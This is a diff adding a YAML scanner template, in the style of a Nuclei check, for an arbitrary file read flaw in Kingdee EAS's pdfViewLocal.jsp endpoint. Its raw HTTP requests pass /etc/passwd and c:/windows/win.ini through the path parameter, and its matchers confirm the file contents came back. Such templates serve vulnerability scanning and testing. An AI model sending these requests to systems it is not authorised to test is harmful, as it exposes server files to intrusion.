@@ -1,0 +1,32 @@
+id: jindieOA-EAS-pdfviewlocal-read-file
+info:
+  name: 金蝶EAS_pdfviewlocal任意文件读取漏洞
+  author: cnaq
+  severity: medium
+  description: 金蝶EAS_pdfviewlocal任意文件读取漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E9%87%91%E8%9D%B6EAS_pdfviewlocal%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  tags: jindieOA,server_file,Apusic,dir
+requests:
+  - raw:
+      - | #linux
+        GET /plt_document/fragments/content/pdfViewLocal.jsp?path=/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+      - | #windows
+        GET /plt_document/fragments/content/pdfViewLocal.jsp?path=c:/windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
+
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
